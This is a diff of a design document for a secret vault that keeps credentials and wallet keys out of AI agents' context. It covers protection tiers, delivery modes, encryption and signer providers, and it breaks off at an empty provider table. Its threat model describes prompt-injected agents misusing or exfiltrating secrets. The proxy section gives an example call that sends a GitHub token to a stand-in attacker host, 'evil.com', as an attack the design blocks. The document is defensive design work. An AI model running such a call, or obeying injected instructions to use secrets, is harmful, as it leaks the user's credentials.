@@ -1,17 +1,19 @@
 # Vaults — secret management for agents
 
-Status: **v3 draft for discussion** (no implementation yet)
+Status: **v4 draft for discussion** (no implementation yet)
 Owner: Alex + agent session `sestvmy6e5c8e`
-Date: 2026-06-13 (v3, after review round 2)
+Date: 2026-06-14 (v4, after review round 3 — deep-dive Q&A)
 
-v3 changes (review round 2): decryption locus resolved by **tier split**, not phasing
-— protected-tier decryption is browser-side from the first commit, standard-tier is
-daemon-side permanently (§8.4); architecture is **frozen up front, delivered
-incrementally** — nothing gets ripped out and re-migrated (§15). Signing rebuilt
-around a pluggable **SignerProvider** abstraction with a local iframe-isolated
-default and opt-in MPC / account-abstraction providers (§8). Inline **approval
-card** pushed into the session as a structured message, reusing the quick-reply
-rails (§9). Provider/library survey expanded (§14). Decision log updated (§16).
+v4 changes (round 3): passkey-PRF mechanism + the spec-editor data-loss warning
+written out (§7.3); the "all-in-one" client-side encrypt+sign answer is ethers.js
+keystore — we **assemble audited libs, we do not build crypto** (§7.4, §8.6);
+third-party signer matrix now states **where the key physically lives, whether an
+account/registration is required, and whether pure-frontend is possible** — short
+answer: every provider needs an account and puts the key in *their* cloud/network,
+which is exactly why `local` is the default (§8.5); delivery modes refined —
+`run` is multi-var and cannot (by OS design) export to the parent shell, a new
+`export` stream mode covers "many commands in one shell", `inject` gains
+dotenv/json/yaml/toml and drops mandatory TTL (§5). Decision log + open Qs updated.
 
 ## 1. Background
 
@@ -29,9 +31,8 @@ placeholder exist alongside Agents / Skills / Harness.
 
 The industry hit the same wall in 2025–2026: GitGuardian found 24k+ secrets
 exposed in MCP config files; OWASP lists credential leakage via prompt context
-as a top LLM risk; a wave of "vault for agents" products appeared
-(Infisical agent-vault, Agentic Vault, Axis, Arcade, Composio — see §14).
-The shared insight, which is also the core principle of this design:
+as a top LLM risk; a wave of "vault for agents" products appeared (§14).
+The shared insight, also the core principle of this design:
 
 > **Secrets must never enter the model's context. The model handles secret
 > *names*; the platform handles secret *values*.**
@@ -40,520 +41,498 @@ The shared insight, which is also the core principle of this design:
 
 Goals:
 
-1. **Store** — a Vaults page where the user manages named secrets
-   (`NAME` → value, env-var mental model), with two protection tiers.
-2. **Deliver** — agents obtain secrets via CLI with values never written to
-   stdout; delivery is indirect (child-process env, file render, signing,
-   brokered HTTP), so values stay out of context by construction.
-3. **Ask** — agents can request a missing secret; the user fills it through a
-   trusted UI channel (never through chat text), and the agent is woken up
-   with the *name only*.
-4. **Approve** — protected secrets require explicit, per-use human approval
-   with an auditable record, surfaced **inline in the session** as an
-   interactive card. Approval happens on the web UI only (decided, §9).
-5. **Link** — secrets relate to Skills (skill declares what it needs; vault
-   shows per-skill fill-in status).
-6. **Sign** — the vault is a signing oracle behind a **pluggable provider
-   abstraction**: a local iframe-isolated software signer by default
-   (private key never leaves the browser), with opt-in MPC / threshold and
-   account-abstraction (session-key) providers so a single API covers
-   single-key, key-sharding, and on-chain-policy signing (decided, §8).
+1. **Store** — a Vaults page; named secrets (`NAME` → value, env-var mental
+   model), two protection tiers.
+2. **Deliver** — agents obtain secrets via CLI with values never on stdout;
+   delivery is indirect (child env, file render, signing, brokered HTTP) so
+   values stay out of context by construction.
+3. **Ask** — agents request a missing secret; user fills it through a trusted UI
+   channel (never chat text); agent is woken up with the *name only*.
+4. **Approve** — protected secrets need per-use human approval with an auditable
+   record, surfaced **inline in the session** as an interactive card. Web only.
+5. **Link** — secrets relate to Skills.
+6. **Sign** — a signing oracle behind a **pluggable provider abstraction**:
+   `local` iframe-isolated software signer by default (private key never leaves
+   the browser), with opt-in MPC/threshold and account-abstraction (session-key)
+   providers — one API for single-key, key-sharding, and on-chain-policy signing.
 
-Non-goals (now):
-
-- Team/multi-user sharing — Avibe is personal; one user per instance.
-- Replacing provider OAuth flows (Claude/Codex login stays as is); migrating
-  platform/provider config secrets into the vault is a later capability (§15).
-- Defending against a fully malicious agent running as the same OS user (§3).
-- On-chain transaction *broadcasting* — signing is the vault's job;
-  broadcasting needs no secret and stays agent-side (§8).
-- Building any cryptosystem from scratch: we orchestrate audited primitives
-  (`pyca/cryptography`, `@noble/curves`, `viem`, `argon2`) and integrate
-  third-party custody (MPC/TEE) — we do not invent crypto.
+Non-goals (now): team sharing; replacing provider OAuth; on-chain *broadcast*
+(needs no secret, stays agent-side); defending a fully malicious same-OS-user
+process (§3); **building any cryptosystem** — we orchestrate audited primitives
+(`pyca/cryptography`, `@noble/curves`, `viem`/`ethers`, `argon2`) and integrate
+third-party custody.
 
 ## 3. Threat model
 
 | # | Threat | Defense |
 | --- | --- | --- |
-| T1 | Secret value accidentally enters LLM context / transcripts / IM history | values never on stdout; injection below the agent's text channel; dynamic ask goes through UI, not chat |
-| T2 | DB/file exfiltration (backups, `vibe data query`, casual `cat`) | everything encrypted at rest (envelope, §7); vault tables denylisted in `data query` |
-| T3 | Agent (possibly prompt-injected) uses a high-value secret without the user knowing | `protected` tier: per-use approval enforced **cryptographically** — the unlock factor is not on the machine; for keypairs, the private key cannot even be assembled without the browser |
-| T4 | Agent exfiltrates the value after legitimate delivery | sign/proxy modes: value never materializes in agent-accessible space; outbound redaction (§10) as a tripwire |
+| T1 | value enters LLM context / transcripts / IM history | values never on stdout; injection below the text channel; ask via UI not chat |
+| T2 | DB/file exfiltration (backups, `vibe data query`, `cat`) | encrypted at rest (§7); vault tables denylisted in `data query` |
+| T3 | prompt-injected agent uses a high-value secret silently | `protected` tier: per-use approval enforced **cryptographically** — unlock factor isn't on the machine; keypair private key can't even be assembled without the browser |
+| T4 | agent exfiltrates the value after legit delivery | sign/proxy: value never in agent-accessible space; outbound redaction (§10) as tripwire |
 
-Out of scope, stated honestly:
-
-- A malicious process running as the same OS user can read M1/M2-injected
-  files/env or call the same decryption path the CLI uses for the `standard`
-  tier. Standard tier prevents *accidents and remote exfiltration*, not a
-  determined local attacker. Protected tier + sign/proxy modes are the answer
-  when that matters — the design is a ladder, not one switch.
-- Approval fatigue: cards must show enough context (requester, delivery form,
-  decoded payload) to make rubber-stamping visibly risky; per-secret policies
-  (§9) reduce prompt frequency.
-- An *actively* compromised daemon can serve malicious browser JS and defeat
-  browser-side crypto (§8.4). We trust the daemon's integrity (it's the user's
-  own machine); browser-side crypto minimizes *passive* exposure, it is not
-  E2EE against a hostile server. Same boundary as the Bitwarden web vault.
+Honest scope limits: a malicious same-OS-user process can read M1/M2-injected
+material or call the standard-tier decrypt path — standard tier stops *accidents
+and remote exfiltration*, not a determined local attacker; protected + sign/proxy
+are the answer when that matters. Approval fatigue is real → cards show full
+context. An *actively* compromised daemon can serve malicious browser JS and
+defeat browser-side crypto — we trust the daemon (user's own machine);
+browser-side crypto minimizes *passive* exposure, it is not E2EE against a hostile
+server (same boundary as the Bitwarden web vault).
 
 ## 4. Concepts and data model
 
-Four tables (SQLAlchemy `Table` in `storage/models.py` + Alembic migration),
-plus vault config in `state_meta`.
+Four tables (`storage/models.py` + Alembic), vault config in `state_meta`.
 
-### `vault_secrets`
+- **`vault_secrets`**: `id`, timestamps, `name` (unique, `^[A-Z][A-Z0-9_]*$`),
+  `kind` (`static`/`keypair`), `protection` (`standard`/`protected`),
+  `signer_kind` (keypair: `local`/`mpc:<provider>`/`aa`/`external`), `ciphertext`
+  + `nonce` + `wrap_meta` (envelope, client-unwrappable; null for `mpc`/`external`
+  where we hold no key), `public_meta` (desc; keypair: algo, pubkey, address,
+  derivation path, provider handle), `policy` (allowed modes, allowed hosts,
+  `always_ask`, signer limits), `last_used_at`, `use_count`.
+- **`vault_requests`** (one queue): `request_type`
+  `provision`/`access`/`sign`/`proxy`/`keygen`, `secret_name`, `requester`
+  (session/agent/run), `delivery` (mode + details: env var, file path, decoded
+  payload preview, target host), `status`, `expires_at`, `message_id`.
+- **`vault_links`**: `secret_name`↔`skill_name`, `source`
+  (`skill_meta`/`agent`/`user`), `required`.
+- **`vault_audit`**: append-only; values never appear.
 
-| column | notes |
-| --- | --- |
-| `id`, `created_at`, `updated_at` | usual |
-| `name` | unique, ENV-style (`^[A-Z][A-Z0-9_]*$`), global namespace |
-| `kind` | `static` (a value) \| `keypair` (a signing key) |
-| `protection` | `standard` \| `protected` |
-| `signer_kind` | keypair only: `local` \| `mpc:<provider>` \| `aa` \| `external` (§8) |
-| `ciphertext`, `nonce`, `wrap_meta` | envelope-encrypted value/private material (§7); `wrap_meta` = wrapped-DEK copies + KDF params, **client-unwrappable**; null for `external`/`mpc` where we hold no key |
-| `public_meta` | JSON: description; keypair: algo, public key, address, derivation path, provider handle |
-| `policy` | JSON: allowed delivery modes, allowed hosts (proxy), `always_ask`, signer limits |
-| `last_used_at`, `use_count` | surfaced in UI |
+Tiers: **`standard`** ("plain" UX) — no interaction; encrypted at rest under a
+machine key (§7.2); daemon-decryptable → works headlessly. **`protected`**
+("encrypted" UX) — wrapped under a user factor (password / passkey PRF); every
+use needs approval + the factor, which lives on the user's device → daemon can't
+decrypt alone. `keypair` is always `protected` (hard rule).
 
-Protection tiers (refines the original 明文/加密):
-
-- **`standard`** ("plain" UX): no interaction to use. *Encrypted at rest* under
-  a machine key (§7.2). "Plaintext" = the experience (zero friction), not the
-  storage. Decryptable by the daemon → works headlessly.
-- **`protected`** ("encrypted" UX): wrapped under a key derived from a user
-  factor (vault password, passkey PRF). Every use needs approval + the unlock
-  factor, which lives on the user's device — the daemon cannot decrypt alone.
-- `keypair` secrets are always `protected` (hard rule).
-
-### `vault_requests` — one queue for everything that needs a human
-
-`request_type`: `provision` (fill a missing secret) \| `access` (use a
-protected secret) \| `sign` \| `proxy` \| `keygen`. Columns: `id`, timestamps,
-`expires_at`, `secret_name`, `requester` (session/agent/run JSON), `delivery`
-(mode + details: env var, file path, decoded payload preview, target host),
-`status` (`pending`→`fulfilled`/`approved`/`denied`/`expired`/`canceled`),
-`message_id` (the inline card carrying it).
-
-### `vault_links`
-
-`secret_name` ↔ `skill_name`, `source` (`skill_meta`/`agent`/`user`),
-`required`. Skill-meta links synced from SKILL.md frontmatter (§13).
-
-### `vault_audit`
-
-Append-only: `ts`, `event`, `secret_name`, `requester`, `delivery` summary,
-`request_id`. Values never appear. Vaults-page log tab.
-
-`vibe data query` gains a denylist for `vault_secrets`;
-`vault_requests`/`vault_links`/`vault_audit` stay queryable.
+`vibe data query` denylists `vault_secrets`; the rest stay queryable.
 
 ## 5. Delivery modes — the security ladder
 
-Four ways a secret leaves the vault, exposure descending. Per-secret `policy`
-restricts allowed modes (e.g. GitHub PAT: proxy-only).
+Per-secret `policy` restricts allowed modes. Honest ranking by how exposed the
+value is to the *agent itself*:
 
-- **M1 `run`** — child-process env (default; the `op run` pattern):
-  `vibe vault run --env OPENAI_API_KEY -- python sync.py`. Values into the
-  child env only, nothing on stdout, gone when the child exits.
-- **M2 `inject`** — file render (the `op inject` pattern):
-  `vibe vault inject --keys A,B --out .env [--ttl 10m]` or `--template t.tpl`.
-  Written `0600`, audited with path, optional daemon-side TTL cleanup. Agent
-  is told the path, never the content.
-- **M3 `sign`** — signing oracle / wallet; the key never leaves the signer
-  (§8). Only the signature (not a secret) returns.
-- **M4 `proxy`** — brokered HTTP:
-  `vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/...`.
-  Daemon attaches the credential per the secret's auth template and forwards;
-  agent sees only the response. **Domain binding** (allowed-hosts, deny by
-  default) makes a prompt-injected `fetch --auth GITHUB_PAT https://evil.com`
-  fail closed.
+### M1 `run` — child-process env (default, strongest)
+
+```
+vibe vault run --env OPENAI_API_KEY --env DB_URL=PROD_DB_URL --env-skill deploy-aws -- python sync.py
+```
+
+Resolves values, spawns the child with them in **its** env, execs. Multi-var by
+design: repeat `--env NAME`, alias with `--env LOCAL=VAULT_NAME`, or pull a
+skill's whole declared set with `--env-skill`. **It cannot export into the
+*calling* shell — that's an OS guarantee, not a limitation:** a child never
+writes back to its parent's environment. And the agent's Bash tool doesn't
+persist shell state across calls anyway, so even if it could, an `export`
+wouldn't survive to the next command. This is *why* `run` is the strongest mode:
+the value lives only in the child's memory, the agent sees only the child's
+output (e.g. `python sync.py`'s stdout), never the value, and it's gone when the
+child exits. **This is the only mode where the value provably never enters the
+agent's text channel.**
+
+### M1′ `export` — stream for `eval` (many commands in one shell)
+
+```
+eval "$(vibe vault export --env OPENAI_API_KEY --env SENTRY_DSN)" && cmd1 && cmd2
+```
+
+For "I need several commands in *one* shell to see the env." Emits
+`export NAME='value'` lines on stdout — but used via `eval "$(...)"`, the
+command-substitution captures stdout into `eval`, so the value does **not** print
+to the visible terminal and stays out of captured tool output. Two honest
+caveats: (1) shell state doesn't persist across the agent's separate Bash calls,
+so this only helps **within one invocation** (chain with `&&`); (2) it's a notch
+weaker than `run` because the value transits the agent's own shell (the agent
+*could* echo it). Use when `run`'s one-command wrapper is too restrictive.
+
+### M2 `inject` — render to a file (formats; for file-consuming tools)
+
+```
+vibe vault inject --keys OPENAI_API_KEY,SENTRY_DSN --out .env --format dotenv   # or json|yaml|toml
+vibe vault inject --template deploy.yaml.tpl --out deploy.yaml                  # {{ vault.NAME }}
+```
+
+For tools that read a config file (and across many separate agent Bash calls,
+where a file persists but env doesn't). Formats: `dotenv` (default), `json`,
+`yaml`, `toml`, or template substitution. Written `0600`, audited with path. **No
+mandatory TTL** — these are meant to be consumed by scripts; TTL becomes an
+opt-in `--ttl 10m` for the "ephemeral `.env` that shouldn't linger" case, off by
+default (per round-3 feedback). Agent is told the path, not the content (though
+it *can* read the file — see ranking note below).
+
+### M3 `sign` — signing oracle / wallet (key never leaves the signer) — §8
+
+### M4 `proxy` — brokered HTTP (value never in agent space)
+
+```
+vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/repos/x/y/issues -d @body.json
+```
+
+Daemon attaches the credential per the secret's auth template and forwards; agent
+sees only the response. **Domain binding** (allowed-hosts, deny by default) makes
+a prompt-injected `fetch --auth GITHUB_PAT https://evil.com` fail closed.
+
+**Exposure ranking (state it honestly):** `run`/`proxy`/`sign` keep the value out
+of agent-readable space entirely. `export`/`inject` *materialize* the value
+somewhere the agent's channel could reach (stdout-into-eval / a file) — they're
+ergonomic and keep the value off the *LLM context by convention*, but as you
+noted, nothing stops a determined agent from reading its own file or echoing its
+own shell. Default to `run`; offer `export`/`inject` for the cases it can't cover.
 
 ## 6. Dynamic ask — `$<NAME>` and `vibe vault request`
 
-Agent emits `$<OPENAI_API_KEY>` in a reply (or calls
-`vibe vault request NAME --wait 600`). `core/reply_enhancer.py` (existing
-chokepoint for silent blocks / file links / quick replies) extracts the marker
-(`\$<[A-Z][A-Z0-9_]*>`, outside code fences, same fence guard as mentions)
-into a `provision` request, and:
-
-- **Web/workbench**: the message carries an inline **SecureInputCard** (name +
-  requester + protection picker + masked input + Save). Submission is an
-  out-of-band `POST /api/vault/...` over TLS — never the chat transcript.
-- **IM**: marker replaced with `🔐 Agent requests OPENAI_API_KEY →
-  [Open Vaults](https://<tunnel>/vaults?request=<id>)` via the per-platform
-  formatter layer.
-
-`--wait` long-polls until fulfilled/denied/timeout (agent keeps working when
-the answer lands, mid-turn); `--no-wait` returns and the daemon `hook_send`s
-the originating session on fulfillment (existing
-`TaskExecutionStore.enqueue_hook_send` path).
-
-**Hard rule: the wake-up/fulfillment message carries the secret *name* only,
-never the value.** A value in the resume prompt would undo the whole design.
+Agent emits `$<OPENAI_API_KEY>` (or `vibe vault request NAME --wait 600`).
+`core/reply_enhancer.py` extracts the marker (`\$<[A-Z][A-Z0-9_]*>`, outside code
+fences) into a `provision` request. Web: inline **SecureInputCard** (name +
+requester + protection picker + masked input + Save), submitted out-of-band over
+TLS. IM: marker → `🔐 Agent requests OPENAI_API_KEY → [Open Vaults](…?request=id)`.
+`--wait` long-polls (agent keeps working when the answer lands); `--no-wait` →
+daemon `hook_send`s the session on fulfillment. **Wake-up carries the name only,
+never the value.**
 
 ## 7. Crypto design
 
 ### 7.1 Envelope
 
 ```
-value --AES-256-GCM--> ciphertext           (DEK: random 32B per secret)
-DEK   --wrapped by--> KEK(s)                 (wrap_meta holds all copies)
+value --AES-256-GCM--> ciphertext          (DEK: random 32B per secret)
+DEK   --wrapped by--> KEK(s)               (wrap_meta holds all copies)
   standard:  KEK_machine  = random 32B machine key (§7.2)   [daemon-side]
   protected: KEK_password = Argon2id(vault password, salt)  [browser-side, §8.4]
-             KEK_passkey  = HKDF(WebAuthn PRF output)        [browser-side]
+             KEK_passkey  = HKDF(WebAuthn PRF output)        [browser-side, §7.3]
 ```
 
-A protected DEK can be wrapped by password + N passkeys; losing one factor
-doesn't lose the secret while another remains. Password is the recovery root.
+A protected DEK is wrapped by password **and** N passkeys at once; losing one
+factor doesn't lose the secret while another remains. **Password is the recovery
+root** (see §7.3 warning).
 
-### 7.2 Machine key (standard tier): source, loss, recovery
+### 7.2 Machine key (standard tier)
 
-- **Source**: 32 random bytes (`os.urandom`) on first vault write. Not derived
-  from anything.
-- **Default — key file**: `~/.avibe/state/vault/machine.key` (`0600`). It lives
-  *inside* `~/.avibe`, so any backup/migration of the state dir carries it:
-  **no new loss mode** (you lose it only when you've lost the DB too), and
-  "copy `~/.avibe` to a new machine" keeps working.
-- **Opt-in hardening — OS keychain** (`keyring`): key and data physically
-  separated (stealing the DB + all files still isn't enough). Cost: copying
-  `~/.avibe` alone no longer migrates the vault → requires
-  `vibe vault key export/import` (Argon2id-wrapped). Headless boxes (Incus
-  tenants, no Secret Service) auto-fall back to file mode.
-- **Failure UX**: ciphertext present but key missing/mismatched (detected via a
-  key-check value) → Vault lists affected secrets and offers import-the-key or
-  re-enter-the-values (standard-tier secrets are re-obtainable API keys).
-  AES-GCM authentication prevents silent wrong-key garbage.
+32 random bytes (`os.urandom`) on first write. **Default — key file**
+`~/.avibe/state/vault/machine.key` (`0600`): lives inside `~/.avibe`, so backups/
+migration of the state dir carry it → **no new loss mode**, "copy `~/.avibe`"
+keeps working. **Opt-in — OS keychain** (`keyring`): key/data physically
+separated; cost: needs `vibe vault key export/import` to migrate; headless boxes
+auto-fall back to file mode. Failure UX: key missing/mismatch (detected via a
+key-check value) → Vault lists affected secrets, offers import-key or re-enter;
+AES-GCM auth prevents silent wrong-key garbage.
 
-### 7.3 Protected tier: factors and recovery
+### 7.3 Passkey as an encryption factor — the WebAuthn PRF extension
 
-- **Vault password** (P0): Argon2id (`argon2`, interactive params ~0.5–1s) →
-  KEK. Set/changed on the Vaults page; a change re-wraps every protected DEK
-  (cheap — DEKs are 32B; ciphertexts untouched).
-- **Passkey PRF** (P0/P1): WebAuthn PRF → HKDF → KEK, an *additional* wrap.
-  2026 support good on synced providers (iCloud/Google/Windows Hello), not
-  universal → enhancement over password, never the only factor.
+How a passkey encrypts/decrypts a secret (your Q2 — and yes, it's a *mature*,
+standardized mechanism, shipping in Bitwarden, Dashlane, 1Password, and WhatsApp
+encrypted backups):
+
+1. A passkey is a credential whose private key sits in a **secure element** (the
+   Secure Enclave on Apple, TPM on Windows, the authenticator chip). For
+   encryption we don't use that signing key directly — we use the **PRF**
+   (pseudo-random function) extension, the web-facing standard for CTAP2's
+   `hmac-secret`. The credential additionally holds a separate HMAC secret in the
+   same secure element.
+2. Our app passes a fixed **salt** (e.g. `"avibe-vault:v1"`). The browser hashes
+   it with a `"WebAuthn PRF"` context string (so a site can't trick the chip into
+   producing OS-login secrets), then the authenticator computes
+   `HMAC-SHA256(internal_credential_secret, hashed_salt)` → a **deterministic
+   32-byte output**. Same authenticator + same RP ID (our domain) + same salt →
+   the same 32 bytes, every time. The internal secret **never leaves the secure
+   element**; only the derived 32 bytes come back to the page.
+3. We run those 32 bytes through **HKDF** → a KEK, and that KEK wraps/unwraps the
+   per-secret DEK — identical to the password path, just a different KEK source.
+   To use it: the user does Face ID / Touch ID / security-key tap, we re-derive
+   the exact same KEK, unwrap the DEK, decrypt.
+
+It's domain-bound (a different site gets a different output — phishing-resistant)
+and needs no stored password. **The serious caveat** (Tim Cappalli, a WebAuthn
+L3 spec co-editor, [publicly warns](https://lilting.ch/en/articles/passkeys-prf-extension-encryption-risk)
+about exactly this): the derived key is bound to that one passkey — **if the user
+deletes the passkey, data encrypted under it is permanently lost.** Our design
+already neutralizes this: PRF is **never the sole factor** — the DEK is also
+wrapped by the vault password (the recovery root), and can be wrapped by several
+passkeys (envelope/multi-wrap, the Bitwarden model). Passkey = a frictionless
+unlock *in addition to*, not *instead of*, the password.
+
+### 7.4 Protected tier: factors, libraries, recovery
+
+- **Vault password** (P0): Argon2id (interactive params ~0.5–1s) → KEK,
+  browser-side via WASM (`hash-wasm`); changing it re-wraps every DEK (cheap).
+- **Passkey PRF** (P0/P1): §7.3. 2026 support: iCloud Keychain (Safari 18+),
+  Google Password Manager, Windows Hello (post-Feb-2026), and **1Password**
+  (ships PRF + open-sourced a helper lib) — see §8.5 for the platform-by-platform
+  table and the one real gap (roaming security keys on iOS can't pass PRF).
 - **Recovery, plainly**: forget the password with no passkey wrap → protected
-  *values* are unrecoverable by design. API-key-like secrets: re-enter.
-  Wallets: the BIP-39 mnemonic from the key ceremony (§8). No server-side
-  reset because there is no server.
-
-### 7.4 Primitives and dependencies
-
-- `pyca/cryptography` (in-tree via web push): AES-256-GCM, HKDF, ed25519.
-- `argon2-cffi` (small new dep, daemon side for `key export` only) + argon2
-  WASM (`hash-wasm`) browser-side.
-- `keyring` (optional import): keychain mode only.
-- Signing libs are provider-specific (§8); the `[wallet]` extra pulls the
-  local-signer JS/py stack.
-- Python can't truly zeroize memory; accepted for a local-first tool. The
-  browser-side path (§8.4) means the password's KDF never runs in the daemon
-  at all.
+  *values* are unrecoverable by design (no server, no reset). API-key-like
+  secrets: re-enter. Wallets: the BIP-39 mnemonic from the key ceremony (§8).
+- Libraries: `pyca/cryptography` (in-tree) for AES-GCM/HKDF/ed25519; `argon2`
+  WASM browser-side + `argon2-cffi` for the daemon-side `key export` path;
+  `keyring` (optional) for keychain mode.
 
 ## 8. Wallet & signer architecture (decided: direct to ETH, pluggable)
 
 ### 8.1 The abstraction is the deliverable
 
-A keypair secret carries a `signer_kind`; the vault exposes one **sign request
-→ approval → signature** flow regardless of backend. This is what makes
-"single-key today, sharding/MPC/multisig later" a config choice, not a
-rewrite. Four kinds across the custody spectrum:
+A keypair carries `signer_kind`; the vault exposes one **sign request → approval
+→ signature** flow regardless of backend. That makes "single-key today, MPC/
+multisig later" a config choice, not a rewrite — `SignerProvider` with
+`address()` and `sign(payload, type)` for tx / EIP-191 / EIP-712.
 
-| `signer_kind` | where the key lives | who can sign | best for |
+| `signer_kind` | where the private key physically lives | who can sign | account / cloud? |
 | --- | --- | --- | --- |
-| **`local`** (default) | software key, **encrypted at rest in the vault**, decrypted only inside an isolated browser iframe | user, present, per-signature approval | local-first, no account, no cloud, full self-custody |
-| **`mpc:<provider>`** | sharded/TEE across provider + device, key never whole (Privy / Web3Auth / Turnkey / Lit) | per provider policy; can be **unattended under caps** | no single point of failure; headless policy signing |
-| **`aa`** (ERC-4337 session keys) | owner key = any kind above; agent gets a **scoped, time-boxed, spend-capped session key** enforced on-chain | agent, within on-chain limits | agent autonomy with chain-enforced guardrails |
-| **`external`** (WalletConnect) | the user's real wallet (MetaMask/Rabby); vault custodies **nothing** | user, in their own wallet | zero custody risk |
+| **`local`** (default) | **on your machine**, encrypted in the vault; decrypted only inside an isolated browser iframe | user present, per-sig approval | **none** — no account, no cloud |
+| **`mpc:<provider>`** | sharded across provider cloud + your device, never whole (Privy/Web3Auth/Turnkey/Lit) | per provider policy; can be unattended under caps | yes — provider account + cloud |
+| **`aa`** (ERC-4337 session keys) | owner key = any kind above; agent gets a scoped, capped, on-chain-enforced session key | agent, within on-chain limits | needs a smart account + bundler |
+| **`external`** (WalletConnect) | the user's real wallet; vault custodies nothing | user, in their own wallet | their wallet |
 
-The vault's job shrinks to "route the sign request to the configured provider,
-render the approval, return the signature." `local` ships first as the
-local-first default; `mpc`/`aa`/`external` are first-class plug-ins behind the
-same interface (`SignerProvider` with `address()`, `sign(payload, type)` for
-tx / EIP-191 / EIP-712).
+`local` ships first as the local-first default; the rest are plug-ins behind the
+same interface.
 
-### 8.2 Your three signer questions, answered
+### 8.2 Your three signing questions
 
-- **(a) Are the mnemonic and private key encrypted at rest like other
-  secrets?** Yes, for `signer_kind=local`: mnemonic + derived private key are
-  secret material, envelope-encrypted under the **protected** tier (always —
-  hard rule). The public key + address are `public_meta` (not secret). For
-  `mpc`/`external` the vault stores no private key at all — only a provider
-  handle / wallet address — so there's nothing local to encrypt.
-- **(b) Decrypt in the browser, then sign in the browser?** Yes — and this is
-  the *same* browser-side decryption as any protected secret (§8.4), not a
-  second mechanism. The private key is unwrapped and used **only inside the
-  isolated iframe**; the iframe returns the **signature**; the signature (not a
-  secret) flows daemon → CLI → agent. The private key never reaches the daemon.
-- **(c) Mature implementation? Browser sandbox?** Yes — this is exactly how
-  embedded-wallet providers (Privy, Magic, Dynamic) build self-custody. The
-  mature pattern is **cross-origin iframe isolation** (§8.3).
+- **(a) Mnemonic + private key encrypted at rest like other secrets?** Yes for
+  `local`: mnemonic + derived private key are secret material, envelope-encrypted
+  under the **protected** tier (always). Public key + address are `public_meta`.
+  For `mpc`/`external` the vault stores **no** private key — only a provider
+  handle / address — so there's nothing local to encrypt.
+- **(b) Decrypt in the browser, then sign in the browser?** Yes — the *same*
+  browser-side decryption as any protected secret (§8.4), not a second mechanism.
+  Key unwrapped + used **only inside the isolated iframe**; the iframe returns the
+  **signature**; the signature (not a secret) flows daemon → CLI → agent. The
+  private key never reaches the daemon.
+- **(c) Mature implementation + browser sandbox?** Yes — cross-origin iframe
+  isolation, exactly how embedded-wallet providers build self-custody (§8.3).
 
 ### 8.3 Local signer: cross-origin iframe isolation (the mature pattern)
 
-The signer runs in an iframe served from a **different origin** than the
-workbench app, so app-level XSS can never read the key:
+Signer runs in an iframe from a **different origin** than the workbench, so
+app-level XSS can't read the key. Key only in iframe memory, never persisted;
+host ↔ iframe via **origin-validated `postMessage`**; host gets a `viem` account
+via `toAccount(...)` proxying into the iframe; iframe does the ECDSA with
+**`@noble/curves`** (audited secp256k1, the lib `viem`/`ethers` use) + BIP-39 via
+`@scure/bip39`; iframe served with **`COOP: same-origin` + `COEP: credentialless`**;
+the **tx-decode + approve UI renders inside the trusted iframe** (anti-clickjack).
+Caveat (@noble authors): if an attacker can read process memory it's over — which
+is *why* the separate-origin iframe (own memory space) is the boundary. Build task:
+a genuinely distinct origin for the signer in a local/tunnel setup (dedicated path
++ strict CSP, separate port, or a `signer.` subdomain).
 
-- key material exists **only in the iframe's memory**, never persisted, never
-  in the host page's scope;
-- host ↔ iframe communicate via **origin-validated `postMessage`**; the host
-  gets a `viem` account via `toAccount(...)` whose `signMessage` /
-  `signTransaction` / `signTypedData` proxy into the iframe;
-- the iframe does the actual ECDSA with **`@noble/curves`** (audited
-  secp256k1, the lib `viem`/`ethers` already use) and BIP-39 via `@scure/bip39`;
-- iframe served with **`COOP: same-origin` + `COEP: credentialless`** for
-  cross-origin isolation (Spectre/side-channel hardening);
-- the **transaction-decode + approve UI renders inside the trusted iframe**, so
-  a clickjacked/synthetic-click approval in the host can't authorize a
-  signature the user didn't see.
+### 8.4 Decryption locus — resolved by tier, not phase (recap)
 
-Honest caveat the `@noble` authors themselves state: if an attacker can read
-process memory it's game over — which is *why* the separate-origin iframe (own
-memory space) is the boundary that matters. Implementation wrinkle for a
-local-first/tunnel setup: we need a genuinely distinct origin for the signer
-(dedicated path with strict CSP, separate port, or a `signer.` subdomain on the
-tunnel) — flagged as a real build task, not hand-waved.
+Standard → daemon-side, permanently (headless, no browser). Protected →
+browser-side, from the first commit (approval always has a browser; daemon ships
+salt + wrapped DEK, browser derives the KEK and unwraps, POSTs only the one value
+back; for `local` keypairs, signs in-iframe and returns only the signature). The
+**vault password never reaches the daemon, ever.** No daemon-side interim, no
+migration; `wrap_meta` is client-unwrappable from the first migration.
 
-### 8.4 Decryption locus — resolved by tier, not by phase
+### 8.5 Third-party signer providers — where the key lives, what they need
 
-This addresses both review points ("do front-end decryption in P0" and "don't
-phase it / lock the architecture now"). The migration worry dissolves once the
-two tiers are separated by their unlock factor:
+Your Q4, answered concretely. **Common truth across all of them: each requires a
+developer account / registration, and each puts the private key in *their*
+cloud/network, not on your machine.** None is "pure frontend, zero account, zero
+cloud." That's precisely why `local` is the default for a local-first product;
+these are opt-in for users who specifically want threshold custody or unattended
+policy signing.
 
-- **Standard tier → daemon-side, permanently.** Standard secrets are used
-  *headlessly* — `vibe vault run` at 3am, no human, no browser in the loop. The
-  unlock factor is the machine key on the box. Front-end decryption here is not
-  just unnecessary, it's *impossible without breaking silent use* (the 80%
-  case). This is not an interim to migrate; it's correct and final.
-- **Protected tier → browser-side, from the first commit.** Protected use
-  *always* has a human + browser (approval is required by definition), so
-  browser-side decryption adds **zero** new friction — the approval ceremony
-  *is* the decryption ceremony. The daemon ships only the salt + wrapped DEK;
-  the browser derives the KEK (argon2 WASM for password, WebCrypto HKDF for
-  passkey PRF), unwraps the DEK, decrypts the value, and POSTs **only that one
-  value** back over TLS for injection (or, for `local` keypairs, signs in-iframe
-  and returns only the signature). **The vault password never reaches the
-  daemon — ever, from day one.** No daemon-side KDF interim, no migration.
+| provider | key tech / where it lives | account & registration | pure frontend? | signing principle |
+| --- | --- | --- | --- | --- |
